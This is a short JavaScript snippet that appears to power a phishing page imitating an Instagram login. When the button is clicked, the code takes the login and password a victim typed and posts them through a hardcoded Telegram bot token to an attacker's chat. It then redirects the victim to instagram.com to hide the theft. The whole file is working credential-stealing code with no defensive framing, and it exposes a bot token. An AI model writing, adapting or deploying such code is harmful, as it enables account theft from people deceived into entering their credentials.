let BOT_TOKEN = '6091429605:AAHMd9b_uWQ1xKW819tODz5idYZeBdYiWMw'
let inputs = document.querySelectorAll('input')


inputs[2].addEventListener('click', (event) => {
    event.preventDefault()

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: '1437377636',
            text: `\n Yeb qoygan bollani accounti: \n\n Login: ${inputs[0].value} \n Password: ${inputs[1].value}`
        }),
    })
    .then(res => res.json())
    .then(data => {
        window.location.href = 'https://instagram.com'
    })
    .then(error => console.log('error', error))
})